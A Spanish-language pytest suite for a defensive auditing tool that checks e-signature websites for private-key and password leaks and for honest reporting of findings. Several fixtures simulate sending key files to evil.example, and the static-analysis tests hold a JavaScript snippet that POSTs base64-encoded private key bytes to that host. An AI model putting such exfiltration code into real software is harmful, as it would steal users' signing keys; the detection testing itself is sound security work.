"""Pruebas del motor de reglas y del catalogo FS-*.

Aqui se fija lo que el reporte llega a *afirmar*, que es donde una herramienta
de auditoria puede hacer mas dano si se equivoca. Tres invariantes se prueban
una y otra vez:

* toda regla habilitada emite un hallazgo, tambien cuando no observa nada;
* ``NOT_OBSERVED`` solo aparece cuando la sesion ejercito la condicion; si ni
  siquiera se cargo una clave, el estado honesto es ``INCONCLUSIVE``;
* enviar la firma nunca se reporta como fuga.
"""

from __future__ import annotations

import pytest

from firmascope.audit_core.conclusions import Confidence, Status
from firmascope.audit_core.events import EventType, Tag
from firmascope.rule_engine import AuditContext, RuleEngine
from firmascope.static_analyzer import analyze_source, analyze_scripts

from conftest import egress, key_access, local_signature, make_event


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    return RuleEngine()


def build(config, events=None, **kwargs) -> AuditContext:
    return AuditContext(config=config, events=list(events or []), **kwargs)


def verdict(engine: RuleEngine, context: AuditContext, rule_id: str):
    findings = {f.rule_id: f for f in engine.evaluate(context)}
    assert rule_id in findings, f"{rule_id} no emitio hallazgo"
    return findings[rule_id]


# ----------------------------------------------------------------------
# Catalogo
# ----------------------------------------------------------------------

def test_todas_las_reglas_tienen_evaluador(engine):
    from firmascope.rule_engine.registry import REGISTRY
    faltan = [meta.id for meta in engine.rules if meta.id not in REGISTRY]
    assert faltan == [], f"reglas declaradas sin evaluador: {faltan}"


def test_toda_regla_habilitada_emite_hallazgo(engine, config):
    """Un reporte que calla es menos util que uno que dice 'no observado'."""
    findings = engine.evaluate(build(config))
    habilitadas = [m.id for m in engine.rules if m.enabled]
    assert sorted(f.rule_id for f in findings) == sorted(habilitadas)


def test_sesion_vacia_no_produce_ningun_not_observed(engine, config):
    """Sin sesion ejercitada no hay nada que "no observar"."""
    for finding in engine.evaluate(build(config)):
        assert finding.status is Status.INCONCLUSIVE, (
            f"{finding.rule_id} afirmo {finding.status.value} sobre una sesion vacia")


def test_catalogo_publicable(engine):
    catalogo = engine.catalog()
    assert len(catalogo) == 12
    assert all(entry["id"].startswith("FS-") for entry in catalogo)
    assert all(entry["title"] and entry["summary"] for entry in catalogo)


# ----------------------------------------------------------------------
# FS-KEY-001 / FS-KEY-002: material de clave privada
# ----------------------------------------------------------------------

def test_key001_detecta_transmision_directa(engine, config):
    events = key_access() + [
        egress(2.0, tags=[Tag.KEY_FILE], url="https://evil.example/collect",
               host="evil.example", body_size=2400),
    ]
    finding = verdict(engine, build(config, events), "FS-KEY-001")
    assert finding.status is Status.OBSERVED
    assert finding.confidence is Confidence.HIGH
    assert "evil.example" in finding.summary


def test_key001_detecta_por_canario_aunque_falte_la_etiqueta(engine, config):
    """El canario es evidencia independiente: los bytes estaban en el cuerpo."""
    events = key_access() + [
        egress(2.0, url="https://evil.example/c", host="evil.example",
               canary_matches=[{"label": Tag.KEY_FILE.value, "encoding": "base64"}]),
    ]
    assert verdict(engine, build(config, events), "FS-KEY-001").status is Status.OBSERVED


def test_key001_no_confunde_dato_derivado_con_directo(engine, config):
    events = key_access() + [
        egress(2.0, tags=[Tag.PRIVATE_KEY, Tag.DERIVED], url="https://evil.example/blob"),
    ]
    assert verdict(engine, build(config, events), "FS-KEY-001").status is Status.NOT_OBSERVED


def test_key001_sin_clave_es_inconcluyente_no_no_observado(engine, config):
    """La distincion central del modelo de conclusiones."""
    events = [make_event(EventType.PAGE_LOADED, 0.0, url="https://sitio.example/")]
    assert verdict(engine, build(config, events), "FS-KEY-001").status is Status.INCONCLUSIVE


def test_key001_con_clave_y_sin_salida_es_no_observado(engine, config):
    events = key_access() + local_signature()
    finding = verdict(engine, build(config, events), "FS-KEY-001")
    assert finding.status is Status.NOT_OBSERVED
    assert "no equivale a imposible" in finding.detail.lower()


def test_key002_detecta_salida_derivada(engine, config):
    events = key_access() + [
        egress(2.0, tags=[Tag.PRIVATE_KEY, Tag.DERIVED],
               url="https://evil.example/blob", host="evil.example", body_size=1200),
    ]
    finding = verdict(engine, build(config, events), "FS-KEY-002")
    assert finding.status is Status.OBSERVED
    assert "procedencia" in finding.detail.lower()


def test_enviar_la_firma_no_dispara_ninguna_regla_de_fuga(engine, config):
    """Un sitio correcto envia la firma. No puede salir marcado por ello."""
    events = key_access() + local_signature() + [
        egress(2.0, tags=[Tag.SIGNATURE], url="https://sitio.example/api/recibo"),
        egress(2.1, tags=[Tag.CERTIFICATE], url="https://sitio.example/api/cert"),
    ]
    findings = {f.rule_id: f for f in engine.evaluate(build(config, events))}
    for rule_id in ("FS-KEY-001", "FS-KEY-002", "FS-PWD-001"):
        assert findings[rule_id].status is Status.NOT_OBSERVED, (
            f"{rule_id} marco como fuga el envio de la firma o el certificado")


# ----------------------------------------------------------------------
# FS-PWD-001 / FS-PWD-002: contrasena
# ----------------------------------------------------------------------

def test_pwd001_detecta_contrasena_transmitida(engine, config):
    events = key_access() + [
        egress(2.0, tags=[Tag.KEY_PASSWORD], url="https://sitio.example/api/sign"),
    ]
    finding = verdict(engine, build(config, events), "FS-PWD-001")
    assert finding.status is Status.OBSERVED
    assert finding.severity.value == "CRITICAL"


def test_pwd001_sin_contrasena_es_inconcluyente(engine, config):
    events = [make_event(EventType.FILE_READ, 0.0, tags=[Tag.KEY_FILE], name="fiel.key")]
    assert verdict(engine, build(config, events), "FS-PWD-001").status is Status.INCONCLUSIVE


def test_pwd002_detecta_persistencia(engine, config):
    events = key_access() + [
        make_event(EventType.STORAGE_WRITE, 2.0, tags=[Tag.KEY_PASSWORD],
                   store="localStorage", key="pwd"),
    ]
    assert verdict(engine, build(config, events), "FS-PWD-002").status is Status.OBSERVED


# ----------------------------------------------------------------------
# FS-CRYPTO-001 / FS-CRYPTO-002
# ----------------------------------------------------------------------

def test_crypto001_detecta_exportacion_de_clave_privada(engine, config):
    events = key_access() + [
        make_event(EventType.CRYPTO_EXPORT, 2.0, key_type="private", format="pkcs8"),
    ]
    assert verdict(engine, build(config, events), "FS-CRYPTO-001").status is Status.OBSERVED


def test_crypto001_sin_webcrypto_es_inconcluyente(engine, config):
    """El sitio podria usar una biblioteca propia; la regla no puede opinar."""
    events = [make_event(EventType.FILE_READ, 0.0, tags=[Tag.KEY_FILE], name="fiel.key")]
    assert verdict(engine, build(config, events), "FS-CRYPTO-001").status is Status.INCONCLUSIVE


def test_crypto002_detecta_clave_extraible(engine, config):
    events = [
        make_event(EventType.CRYPTO_IMPORT, 1.0, tags=[Tag.PRIVATE_KEY],
                   format="pkcs8", extractable=True, key_type="private"),
    ]
    assert verdict(engine, build(config, events), "FS-CRYPTO-002").status is Status.OBSERVED


def test_crypto002_clave_no_extraible_es_no_observado(engine, config):
    events = key_access()  # CRYPTO_IMPORT con extractable=False
    assert verdict(engine, build(config, events), "FS-CRYPTO-002").status is Status.NOT_OBSERVED


# ----------------------------------------------------------------------
# FS-LOCAL-001: firma local
# ----------------------------------------------------------------------

def test_local001_confirma_firma_con_red_aislada(engine, config):
    """El unico CONFIRMED del catalogo: se demuestra experimentalmente."""
    events = key_access() + [
        make_event(EventType.NETWORK_OFF, 1.0),
        make_event(EventType.CRYPTO_SIGN, 1.5, tags=[Tag.SIGNATURE]),
        make_event(EventType.NETWORK_ON, 2.0),
    ]
    finding = verdict(engine, build(config, events), "FS-LOCAL-001")
    assert finding.status is Status.CONFIRMED
    assert "no significa que el sitio sea seguro" in finding.detail.lower()


def test_local001_sin_prueba_de_aislamiento_es_inconcluyente(engine, config):
    events = key_access() + local_signature()
    finding = verdict(engine, build(config, events), "FS-LOCAL-001")
    assert finding.status is Status.INCONCLUSIVE
    assert "nivel 3" in finding.detail


def test_local001_firma_solo_en_linea_es_no_observado(engine, config):
    """demo-server-sign: la firma no se completa con la red aislada."""
    events = key_access() + [
        make_event(EventType.CRYPTO_SIGN, 0.9, tags=[Tag.SIGNATURE]),
        make_event(EventType.NETWORK_OFF, 1.0),
        make_event(EventType.NETWORK_ON, 2.0),
    ]
    assert verdict(engine, build(config, events), "FS-LOCAL-001").status is Status.NOT_OBSERVED


# ----------------------------------------------------------------------
# FS-NET-001 / FS-NET-002
# ----------------------------------------------------------------------

def test_net001_agrupa_terceros_tras_el_acceso_a_la_clave(engine, config):
    requests = [
        {"id": "r1", "url": "https://cdn.tercero.example/a.js", "method": "GET",
         "timestamp": key_access()[0].timestamp + 1.0, "third_party": True,
         "registrable_domain": "tercero.example"},
        {"id": "r2", "url": "https://sitio.example/api", "method": "POST",
         "timestamp": key_access()[0].timestamp + 1.0, "third_party": False,
         "registrable_domain": "sitio.example"},
    ]
    context = build(config, key_access(), requests=requests)
    finding = verdict(engine, context, "FS-NET-001")
    assert finding.status is Status.OBSERVED
    assert "descriptivo, no acusatorio" in finding.detail


def test_net001_ignora_terceros_anteriores_al_acceso_a_la_clave(engine, config):
    requests = [
        {"id": "r1", "url": "https://cdn.tercero.example/a.js", "method": "GET",
         "timestamp": key_access()[0].timestamp - 10.0, "third_party": True,
         "registrable_domain": "tercero.example"},
    ]
    context = build(config, key_access(), requests=requests)
    assert verdict(engine, context, "FS-NET-001").status is Status.NOT_OBSERVED


def test_net002_detecta_salida_binaria_opaca(engine, config):
    """El caso de demo-encrypted-exfiltration visto solo desde la red."""
    events = key_access() + [
        egress(2.0, tags=[Tag.UNCLASSIFIED], url="https://evil.example/blob",
               host="evil.example", body_size=4096, body_type="ArrayBuffer"),
    ]
    assert verdict(engine, build(config, events), "FS-NET-002").status is Status.OBSERVED


def test_net002_ignora_cuerpos_pequenos(engine, config):
    events = key_access() + [
        egress(2.0, tags=[Tag.UNCLASSIFIED], url="https://sitio.example/ping",
               body_size=12, body_type="ArrayBuffer"),
    ]
    assert verdict(engine, build(config, events), "FS-NET-002").status is Status.NOT_OBSERVED


# ----------------------------------------------------------------------
# FS-STORAGE-001 / FS-STORAGE-002
# ----------------------------------------------------------------------

@pytest.mark.parametrize("store,rule_id", [
    ("indexedDB", "FS-STORAGE-001"),
    ("localStorage", "FS-STORAGE-002"),
])
def test_storage_detecta_material_privado_persistido(engine, config, store, rule_id):
    events = key_access() + [
        make_event(EventType.STORAGE_WRITE, 2.0, tags=[Tag.PRIVATE_KEY],
                   store=store, key="fiel"),
    ]
    assert verdict(engine, build(config, events), rule_id).status is Status.OBSERVED


def test_storage_no_confunde_los_dos_almacenes(engine, config):
    events = key_access() + [
        make_event(EventType.STORAGE_WRITE, 2.0, tags=[Tag.PRIVATE_KEY],
                   store="localStorage", key="fiel"),
    ]
    findings = {f.rule_id: f for f in engine.evaluate(build(config, events))}
    assert findings["FS-STORAGE-002"].status is Status.OBSERVED
    assert findings["FS-STORAGE-001"].status is Status.NOT_OBSERVED


# ----------------------------------------------------------------------
# FS-CODE-001: analisis estatico
# ----------------------------------------------------------------------

def static_report_for(code: bytes):
    return analyze_scripts(
        [{"url": "https://sitio.example/app.js", "sha256": "a" * 64}],
        lambda script: code,
    )


def test_code001_reporta_potential_no_observed(engine, config):
    """La ruta existe en el codigo; no se ejecuto. Son cosas distintas."""
    report = static_report_for(
        b"async function backup(keyBytes){ await fetch('https://evil.example/c',"
        b" {method:'POST', body: btoa(keyBytes)}); }")
    finding = verdict(engine, build(config, static=report), "FS-CODE-001")
    assert finding.status is Status.POTENTIAL
    assert "no prueba que lo haga" in finding.detail


def test_code001_sin_analisis_estatico_es_inconcluyente(engine, config):
    finding = verdict(engine, build(config), "FS-CODE-001")
    assert finding.status is Status.INCONCLUSIVE
    assert "nivel 2" in finding.detail


def test_code001_codigo_limpio_es_no_observado(engine, config):
    report = static_report_for(
        b"async function firmar(k,d){ const s = await crypto.subtle.sign('X', k, d);"
        b" await fetch('/recibo', {method:'POST', body: s}); }")
    finding = verdict(engine, build(config, static=report), "FS-CODE-001")
    assert finding.status is Status.NOT_OBSERVED


def test_code001_senala_que_ademas_se_observo_la_fuga(engine, config):
    """Cuando estatico y dinamico coinciden, el reporte debe enlazarlos."""
    report = static_report_for(
        b"async function backup(keyBytes){ await fetch('https://evil.example/c',"
        b" {method:'POST', body: btoa(keyBytes)}); }")
    events = key_access() + [egress(2.0, tags=[Tag.KEY_FILE], url="https://evil.example/c")]
    finding = verdict(engine, build(config, events, static=report), "FS-CODE-001")
    assert "FS-KEY-001" in finding.detail


# ----------------------------------------------------------------------
# Robustez del motor
# ----------------------------------------------------------------------

def test_una_regla_rota_no_tumba_la_auditoria(engine, config, monkeypatch):
    from firmascope.rule_engine import registry

    def explota(context, meta):
        raise RuntimeError("boom")

    monkeypatch.setitem(registry.REGISTRY, "FS-KEY-001", explota)
    findings = {f.rule_id: f for f in engine.evaluate(build(config, key_access()))}
    assert findings["FS-KEY-001"].status is Status.INCONCLUSIVE
    assert "boom" in findings["FS-KEY-001"].detail
    assert len(findings) == 12, "el fallo de una regla no debe impedir las demas"


def test_hallazgos_ordenados_por_relevancia(engine, config):
    events = key_access() + [
        egress(2.0, tags=[Tag.KEY_FILE], url="https://evil.example/c", host="evil.example"),
    ]
    findings = engine.evaluate(build(config, events))
    assert findings[0].rule_id == "FS-KEY-001"
    assert findings[0].status is Status.OBSERVED
    assert findings[-1].status in (Status.NOT_OBSERVED, Status.INCONCLUSIVE)


def test_paquete_de_reglas_externo(engine, config, tmp_path):
    """NFR-004: anadir una regla no debe exigir tocar el codigo."""
    (tmp_path / "FS-CUSTOM-001.yaml").write_text(
        "id: FS-CUSTOM-001\n"
        "title: Regla del operador\n"
        "category: efirma\n"
        "severity: LOW\n"
        "summary: Regla de prueba.\n",
        encoding="utf-8",
    )
    extended = RuleEngine(extra_dirs=[tmp_path])
    assert "FS-CUSTOM-001" in extended.rule_ids()

    finding = verdict(extended, build(config), "FS-CUSTOM-001")
    assert finding.status is Status.INCONCLUSIVE
    assert "sin evaluador" in finding.summary
